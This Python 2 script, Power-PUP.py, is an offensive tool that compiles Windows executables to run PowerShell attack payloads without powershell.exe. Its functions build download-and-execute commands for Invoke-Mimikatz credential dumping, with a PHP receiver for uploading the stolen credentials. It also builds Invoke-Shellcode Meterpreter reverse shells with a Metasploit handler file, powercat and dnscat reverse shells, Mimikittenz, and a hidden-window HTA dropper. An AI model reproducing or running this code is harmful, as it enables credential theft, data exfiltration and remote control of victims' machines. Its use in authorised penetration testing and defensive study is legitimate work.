#---------------------------------------------------------------#
#!/bin/python2                                                  #
#-Metadata------------------------------------------------------#
#  Filename: Power-PUP.py                                       #
#  Released: 2016-07-26                                         #
#  Updated: 2016-07-31                                          #
#                                                               #
#-Info----------------------------------------------------------#
#  Powershell Universal Programmer (Power-PUP.py) is a Windows  #
#    Python script to compile Windows                           #
#    System.Management.Automation for a powershell alternative. #
#                                                               #
#-Author(s)-----------------------------------------------------#
#  Joseph Barcia                    - github.com/jbarcia        #
#  Scott Bernstein (Feel the Bern?) - github.com/scott-be       #
#                                                               #
#-Operating System----------------------------------------------#
#  Designed for: Windows 7+ running .Net Framework 4.5+         #
#     Tested on: Windows 7 running .Net Framework 4.5           #
#                                                               #
#-Licence-------------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT             #
#                                                               #
#-Notes---------------------------------------------------------#
#  USAGE                                                        #
#  Powershell Universal Programmer (Power-PUP.py)               #
#                                                               #
#  Usage: Power-PUP.py -a target_architecture                   #
#  -a | --arch        - architecture of the target host         #
#  -o | --output      - executable output name                  #
#  -m | --mimi        - Create a mimikatz executable            #
#  -s | --shellcode   - Create a shellcode executable           #
#  -d | --hostserver  - PS script host location                 #
#  -l | --lhost       - Host listening for reverse connections  #
#                     Default: 127.0.0.1                        #
#  -p | --lport       - Port listening for reverse connections  #
#                     Default: 443                              #
#  -t | --payload     - Metasploit payload to utilize           #
#                     Default: windows/meterpreter/reverse_https#
#                                                               #
#                                                               #
# Examples:                                                     #
#                                                               #
# Power-PUP.py -a x86                                           #
# Power-PUP.py -a x64 -o psx64.exe                              #
# Power-PUP.py -a x64 -m -d http://192.168.1.1/im.txt           #
# Power-PUP.py -a x64 -s -d http://192.168.1.1/im.txt           #
#                              --lhost 192.168.1.1 --lport 443  #
#                                                               #
#-Future Additions----------------------------------------------#
#  - Detect .Net Version                                        #
#       HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\                  #
#       NET Framework Setup\NDP\v4\Full\InstallPath             #
#  - A/V XOR bypass - sep blocks powersploit invoke expression  #
#                                                               #
#---------------------------------------------------------------#

import sys
import os
import string
import getopt
from sys import argv

name = "Powershell Universal Programmer"
shrtname = " (Power-PUP.py)"
__version__ = "0.7"


banner = '''
                                  ,.+----.
                              ,*""         I
             ____           /         Mbp. dP          __
         ,o@QBBBBBbm,_     ; ,d       /~`QMP'\     _odBBBBbo,
         OBBROYALBBBBBBBBmOBBBM      |    |   |,*~dBBBBBBBBBBBb 
         OBBBBBBBBBBqBBBBBBBBBP      |  0 |0 ,'  dBBBBBBBBBBBBBb
         "*BBBP"     ^OBBBP"          \__/  ~    OBBBBBBBBBBBBBP
     /                     :           __.       `0BBBBBBBBBBP|
                   .-.     `          ~,A.         `0BBBBBBBBP |
                .-(   `x__  `\        .B*Bb          `"?OOP~   ;
             .-(   `\/'   `.  `~--++*\{  `Pb           ,'     ,'
  /         (   `\_/'\__/  )     _    !`-' !`.       ,'     ,'  
       /     `\_/'       ,'     L "+,_|    |-,`.__ ,'    _,','~~\.~~~\\
                \        /\    / ',   "+.  |/ >   `~~~~~~  ,'    :/~  \\
   /             `~===\/'  `\/'    "+.   >{  /\        __.,: |   ;    ;
          /           {         ,|    `\/  \/  `Y~~---~   `. `--:'~~~';
                       `\     ,&#|      ppppppp  \         `,   ;^`~~';
       /               ,d#b,.&###|      PPP  PP   `\     __.;~~' `~~~'
     /              ,d###########|      PPP  PP     Y~~~~
                ,d############i~        PPPPPPP     I  
          ,d##################I         PPP         I     /   /
(#############################b.        PPP         Im 
   )############################b.                 d#b
  (###############################b++g+++~#b      ,d##P
      }####################P~ ~Y####P    J#P`~~~T'
     (###################P'     `YP'    ;P'   ,'
       )###############P'        '    ,'    ,'    /
      (##############P'          __+~'   /##'
 /            Y####P'         ;-'     /###P
           /   Y#P'         /'      /&##P~
                |         /'      /&#P~         
     /          `\______/'\_____/'              
                                   /            
'''

ps_script          = ""

def mimi_quick(mimifunct,location):
    # invoke-mimicatz quick execute

    # If not from comman line
    if mimifunct != True:
        location = raw_input("\nEnter Invoke-Mimikatz location (Ex. http://192.168.1.1/im.txt) : \n: ")
        if location == '':
            location = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
    
    mimiout = raw_input("\nEnter where to upload output file: (Ex. http://192.168.1.1/out.php) : \n: ")
    if mimiout == '':
        ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Mimikatz -DumpCreds > c:\\Users\\Public\\katz.txt"
        print '\nFile will be saved to: c:\\Users\\Public\\katz.txt\n'
    else:
        ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('" + mimiout + "', $output)"

        # create php upload/post file
        with open('upload.php', 'w') as f:
            f.write("<?php \n$file = $_SERVER['REMOTE_ADDR'] . \"_\" . date(\"Y-m-d_H-i-s\") . \".creds\"; \nfile_put_contents($file, file_get_contents(\"php://input\")); \n?> \n")
            f.close

        print '\nFile will be uploaded to: ' + mimiout
        print '\n - To start a simple PHP web server: php -S 127.0.0.1:80'
        print '\n - Move "upload.php" to ' + mimiout + '\n'

    return ps_script
    
def kitti_quick():
    # invoke-mimicatz quick execute

    location = raw_input("\nEnter Invoke-Mimikittenz location (Ex. http://192.168.1.1/im.txt) : \n: ")
    if location == '':
        location = "https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1"
    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-mimikittenz > c:\\Users\\Public\\kitz.txt"

    print '\nFile will be saved to: c:\\Users\\Public\\kitz.txt\n'
    return ps_script
    
def shell_quick(shellcode,location,lhost,lport,payload):
    # invoke-shellcode quick execute

    # If not from comman line
    if shellcode != True:
        location = raw_input("\nEnter Invoke-Shellcode location (Default - Github) : \n: ")
        if location == '':
            location = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1"
        lhost = raw_input("\nEnter reverse host (Default - 127.0.0.1) : \n: ")
        if lhost == '':
            lhost = "127.0.0.1"
        lport = raw_input("\nEnter reverse port (Default - 443) : \n: ")
        if lport == '':
            lport = "443"
        payload = raw_input("\nEnter msf payload (Default - 'windows/meterpreter/reverse_https') : \n: ") 
        if payload == '':
            payload = "windows/meterpreter/reverse_https"
    
    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Shellcode -Payload " + payload + " -Lhost " + lhost + " -Lport " + lport + " -force"
    print '\nSHELLCODE'
    print '   PAYLOAD      : ' + payload
    print '   LHOST        : ' + lhost
    print '   LPORT        : ' + lport
    print 
    print '   Resource file          : handler.rc'
    print '   HTA File (Experimental): pup.hta'
    print

    # create msf rc file
    with open('handler.rc', 'w') as f:
        f.write("\#\n\# [Kali 2.x]:   systemctl start postgresql; msfdb start; msfconsole -q -r 'handler.rc'\n\#\nuse exploit/multi/handler\nset PAYLOAD " + payload + "\nset LHOST " + lhost + "\nset LPORT " + lport + "\nset ExitOnSession false\nrun -j")
        f.close

    create_hta(ps_script)
    return ps_script

def pcat(powercat,location,lhost,lport,payload):
    # invoke-shellcode quick execute

    # If not from comman line
    if powercat != True:
        location = raw_input("\nEnter Powercat location (Default - http://127.0.0.1/pc.txt) : \n: ")
        if location == '':
            location = "http://127.0.0.1/pc.txt"
        lhost = raw_input("\nEnter reverse host (Default - 127.0.0.1) : \n: ")
        if lhost == '':
            lhost = "127.0.0.1"
        lport = raw_input("\nEnter reverse port (Default - 443) : \n: ")
        if lport == '':
            lport = "443"
        payload1 = raw_input("\nEnter Hostname for dnscat (Default - none) : \n: ") 
        if payload1 != '':
            payload = " -dns " + payload1
        else:
            payload = ""
    
    print '\nConfigure Listener'
    if payload == '':
        ps_script = "(IEX (New-Object Net.WebClient).DownloadString('" + location + "')) -or (powercat -c " + lhost + " -p " + lport + " -e cmd)"
        print '   PS : powercat -l -p ' + lport
        print '   PS : (IEX (New-Object System.Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1\')) -or (powercat -l -p ' + lport + ')'
    else:
        ps_script = "(IEX (New-Object Net.WebClient).DownloadString('" + location + "')) -or (powercat -c " + lhost + " -p " + lport + payload + " -e cmd)"
        print '   # : dnscat2 ' + payload1
    print 
    print '   HTA File (Experimental): pup.hta'
    print

    create_hta(ps_script)
    return ps_script


def enter_ps():
    ps_input = raw_input("Enter the powershell commands to execute seperated by <ENTER>. \n: ")
    command = '            String script1 = "' + ps_input + '";\n            ps.AddScript(script1);\n'
    i = 1

    while (ps_input.strip()):
        ps_input = raw_input(': ')
        if ps_input != '':
            i = i + 1
            stri = str(i)
            command += '            String script' + stri + ' = "' + ps_input + '";\n            ps.AddScript(script' + stri + ');\n'
            
#    print command

    #(calc.exe) -or ((sleep -s 10) -or (notepad.exe))
    #ps_script = string.replace(command, '\\', '\\\\')
    ps_script = command
    print
    
    return ps_script
    

def write_csfile(ps_script,comm):
    # Open and create cs file to compile

    ps_script = string.replace(ps_script, '\\', '\\\\')

    with open('temp.cs', 'w') as f:
        f.write('using System;\nusing System.Collections.ObjectModel;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\n\nnamespace pup\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            PowerShell ps = PowerShell.Create();\n')
        if comm != True:
            f.write('            String script1 = "' + ps_script + '";\n            ps.AddScript(script1);\n')
        else:
            f.write(ps_script)
        f.write('            Collection<PSObject> output = null;\n            try\n            {\n                output = ps.Invoke();\n            }\n            catch(Exception e)\n            {\n                Console.WriteLine("Error while executing the script.\\r\\n" + e.Message.ToString());\n            }\n            if (output != null)\n            {\n                foreach (PSObject rtnItem in output)\n                {\n                    Console.WriteLine(rtnItem.ToString());\n                }\n            }\n        }                \n    }\n}\n')
        f.close
    
    
def compile_exe(arch,out_exe):
    # Compile the executable

    if arch == 'x86':
        dotnet_loc = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\"
    else:
        dotnet_loc = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"

    os.system('cmd.exe /c ' + dotnet_loc + 'csc.exe /unsafe /reference:"C:\\windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:' + out_exe + ' /platform:' + arch +' "temp.cs" > nul 2>&1')


def create_hta(ps_script):
    # create hta file - EXPERIMENTAL will probably get flagged

    with open('pup.hta', 'w') as f:
        f.write('<html>\n<head>\n<script language="VBScript">\n    Set objShell1 = CreateObject("Wscript.Shell")\n    Set objShell2 = CreateObject("Wscript.Shell")\n    Set objShell3 = CreateObject("Wscript.Shell")\n    Set objShell4 = CreateObject("Wscript.Shell")\n    Set objShell5 = CreateObject("Wscript.Shell")\n    Set objShell6 = CreateObject("Wscript.Shell")\n    objShell1.Run "cmd.exe /c echo using System; > c:\\users\\public\\temp.cs && echo using System.Collections.ObjectModel; >> c:\\users\\public\\temp.cs && echo using System.Management.Automation; >> c:\\users\\public\\temp.cs && echo using System.Management.Automation.Runspaces; >> c:\\users\\public\\temp.cs && echo namespace pup >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo class Program >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo static void Main(string[] args) >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo PowerShell ps = PowerShell.Create(); >> c:\\users\\public\\temp.cs')
        f.write('&& echo String script1 = ""' + ps_script + '""; >> c:\\users\\public\\temp.cs && echo ps.AddScript(script1); >> c:\\users\\public\\temp.cs",0')
        f.write('\n    objShell2.Run "cmd.exe /c echo Collection^<PSObject^> output = null; >> c:\\users\\public\\temp.cs && echo try >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo output = ps.Invoke(); >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo catch(Exception e) >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo Console.WriteLine(""Error while executing the script.\\r\\n"" + e.Message.ToString()); >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo if (output != null) >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs')
        f.write('&& echo foreach (PSObject rtnItem in output) >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo Console.WriteLine(rtnItem.ToString()); >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs && echo } >> c:\\users\\public\\temp.cs",0')
        f.write('\n    objshell3.Run "cmd.exe /c C:\\Windows\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /unsafe /reference:""C:\\windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll"" /reference:System.IO.Compression.dll /out:c:\\users\\public\\pup.exe /platform:x86 ""c:\\users\\public\\temp.cs""')
        f.write('&& c:\\users\\public\\pup.exe",0')
        f.write('\n</script> \n</head> \n<body> \n<!-- info -->\n</body> \n</html>')
        f.close









def usage():
    print "Usage: Power-PUP.py"
    print "-a | --arch                - architecture of the target host"
    print "-o | --output              - executable output name"
    print "---------------Actions---------------"
    print "-m | --mimi                - Create a mimikatz executable"
    print "-s | --shellcode           - Create a shellcode executable"
    print "-c | --powercat            - Create an executable with a reverse powercat connection"
    print "-----------Payload Options-----------"
    print "-d | --hostserver          - PS script host location"
    print "-l | --lhost               - Host listening for reverse connections"
    print "                               Default: 127.0.0.1"
    print "-p | --lport               - Port listening for reverse connections"
    print "                               Default: 443"
    print "-t | --payload             - Metasploit payload to utilize"
    print "                               Default: windows/meterpreter/reverse_https"
    print
    print "Examples: "
    print "Power-PUP.py"
    #print "Power-PUP.py -a x64 -o psx64.exe"
    #print "Power-PUP.py -a x64 -m -d http://192.168.1.1/im.txt"
    print "Power-PUP.py -a x64 -s -d http://192.168.1.1/is.txt --lhost 192.168.1.1 --lport 443"

    sys.exit(0)


def main():

    # define some global variables
    location           = ""
    lhost              = "127.0.0.1"
    lport              = "443"
    mimifunct          = False
    shellcode          = False
    powercat           = False
    target             = ""
    payload            = "windows/meterpreter/reverse_https"
    arch               = ""
    comm               = False
    debug              = False
    #ps_script          = ""
    
    # Begin
    print "\n" + name + " v" + __version__ + shrtname
    print banner
    # check if running windows
    if os.name != 'nt':
        print "Powershell Universal Programmer (Power-PUP.py) is a Windows Python script to compile Windows System.Management.Automation for a powershell alternative."
        sys.exit(0)

    # check argument length
    #if not len(sys.argv[1:]):
    #        usage()
            
    # read the commandline options
    try:
        # variable: <- variable with argument, no : no argument ex. a
        opts, args = getopt.getopt(sys.argv[1:],"ha:o:md:scl:p:t:",["help","arch","output","mimi","hostserver","shellcode","powercat","lhost","lport","payload","debug"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    # Variables
    out_exe = "ps.exe"        
            
    for o,a in opts:
            if o in ("-h","--help"):
                usage()
            elif o in ("-a", "--arch"):
                arch = a
                while arch not in ["x86", "x64"]:
                    print "\nOnly x86 or x64 architectures are allowed.\n"
                    sys.exit(0)
            elif o in ("-m", "--mimi"):
                mimifunct = True
            elif o in ("-s", "--shellcode"):
                shellcode = True
            elif o in ("-c", "--powercat"):
                powercat = True
            elif o in ("-d", "--hostserver"):
                location = a
            elif o in ("-l", "--lhost"):
                lhost = a
            elif o in ("-p", "--lport"):
                lport = a
            elif o in ("-t", "--payload"):
                payload = a
            elif o in ("-o", "--output"):
                out_exe = a
            elif o in ("--debug"):
                debug = True
            else:
                assert False,"Unhandled Option"

    if mimifunct == True:
        ps_script = mimi_quick(mimifunct,location)
    elif shellcode == True:
        ps_script = shell_quick(shellcode,location,lhost,lport,payload)
    else:
        # Menu if no command line inputs

        if arch == '':
            arch = raw_input("\nEnter target system architecture (x86 or x64) : \n: ")
            while arch not in ["x86", "x64"]:
                print "\nOnly x86 or x64 architectures are allowed.\n"
                sys.exit(0)
        print
        menu = {}
        menu['1']=" Invoke-Mimikatz" 
        menu['2']=" Invoke-Shellcode"
        menu['3']=" Powercat" 
        menu['4']=" Invoke-Mimikittenz" 
        menu['5']=" Custom PowerShell Command"
        menu['9']=" Exit"
        options=menu.keys()
        options.sort()
        for entry in options: 
            print entry, menu[entry]

        selection=raw_input("\nPlease Select:  ")
        if selection =='1':
            ps_script = mimi_quick(mimifunct,location) 
        elif selection == '2': 
            ps_script = shell_quick(shellcode,location,lhost,lport,payload)
        elif selection == '3': 
            ps_script = pcat(powercat,location,lhost,lport,payload)
        elif selection == '4': 
            ps_script = kitti_quick()
        elif selection == '5':
            comm = True
            ps_script = enter_ps() 
        elif selection == '9': 
            sys.exit(0)
        else: 
            print "Unknown Option Selected!" 
            sys.exit(0)

    write_csfile(ps_script,comm)
    compile_exe(arch,out_exe)
    if debug == False:
        os.remove('temp.cs')
    
    
main()